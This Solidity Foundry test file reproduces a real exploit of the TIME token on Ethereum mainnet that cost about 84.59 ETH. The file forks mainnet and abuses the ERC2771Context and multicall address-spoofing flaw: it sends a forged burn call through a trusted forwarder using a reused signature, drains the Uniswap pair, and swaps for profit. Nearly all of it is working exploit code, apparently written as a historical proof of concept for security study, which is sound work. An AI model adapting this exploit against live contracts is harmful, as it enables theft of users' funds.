// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~84.59 ETH
// Attacker : https://etherscan.io/address/0xfde0d1575ed8e06fbf36256bcdfa1f359281455a
// Attack Contract : https://etherscan.io/address/0x6980a47bee930a4584b09ee79ebe46484fbdbdd0
// Vulnerable Contract : https://etherscan.io/address/0x4b0e9a7da8bab813efae92a6651019b8bd6c0a29
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6

// @Analysis
// https://blog.openzeppelin.com/arbitrary-address-spoofing-vulnerability-erc2771context-multicall-public-disclosure

interface IForwarder {
    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }

    function execute(
        ForwardRequest memory req,
        bytes memory signature
    ) external payable returns (bool, bytes memory);
}

interface ITIME is IERC20 {
    function burn(uint256 amount) external;

    function multicall(
        bytes[] memory data
    ) external returns (bytes[] memory results);
}

contract ContractTest is Test {
    ITIME private constant TIME =
        ITIME(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
    IWETH private constant WETH =
        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    Uni_Pair_V2 private constant TIME_WETH =
        Uni_Pair_V2(0x760dc1E043D99394A10605B2FA08F123D60faF84);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IForwarder private constant Forwarder =
        IForwarder(0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81);
    address private constant recoverAddr =
        0xa16A5F37774309710711a8B4E83b068306b21724;

    function setUp() public {
        vm.createSelectFork("mainnet", 18730462);
        vm.label(address(TIME), "TIME");
        vm.label(address(WETH), "WETH");
        vm.label(address(TIME_WETH), "TIME_WETH");
        vm.label(address(Router), "Router");
        vm.label(address(Forwarder), "Forwarder");
        vm.label(recoverAddr, "recoverAddr");
    }

    function testExploit() public {
        deal(address(this), 5 ether);
        emit log_named_decimal_uint(
            "Exploiter ETH balance before attack",
            address(this).balance,
            18
        );
        TIME.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        WETH.deposit{value: 5 ether}();
        WETHToTIME();

        uint256 amountToBurn = 62_227_259_510 * 1e18;
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodePacked(
            TIME.burn.selector,
            amountToBurn,
            address(TIME_WETH)
        );
        bytes memory data = abi.encodeWithSelector(
            TIME.multicall.selector,
            datas
        );

        IForwarder.ForwardRequest memory request = IForwarder.ForwardRequest({
            from: recoverAddr,
            to: address(TIME),
            value: 0,
            gas: 5e6,
            nonce: 0,
            data: data
        });

        // Using signature from attack tx
        bytes32 messageHash = 0x2038560f9bee81aecd0fa852fae43c9e2a4db94c609c3b91dba5ac0f01b4d5c6;
        bytes32 r = 0x9194983a3dbfb5779c09c95f5d830d8435d9ce88b383752c3dfb8a1b84b8c9f5;
        bytes32 s = 0x11b7c750f1334e2f26ca9be32c2d070a4a023edf745b02468d6cba9a15a494c6;
        uint8 v = 27;
        assertEq(ecrecover(messageHash, v, r, s), recoverAddr);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Start exploit here
        Forwarder.execute(request, signature);
        // End exploit
        TIME_WETH.sync();
        TIMEToWETH();
        WETH.withdraw(WETH.balanceOf(address(this)));

        // In the end of attack tx also ~5 ether was transferred to Flashbot
        emit log_named_decimal_uint(
            "Exploiter ETH balance after attack",
            address(this).balance,
            18
        );
    }

    function WETHToTIME() internal {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(TIME);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WETH.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1000
        );
    }

    function TIMEToWETH() internal {
        address[] memory path = new address[](2);
        path[0] = address(TIME);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            TIME.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1000
        );
    }

    receive() external payable {}
}
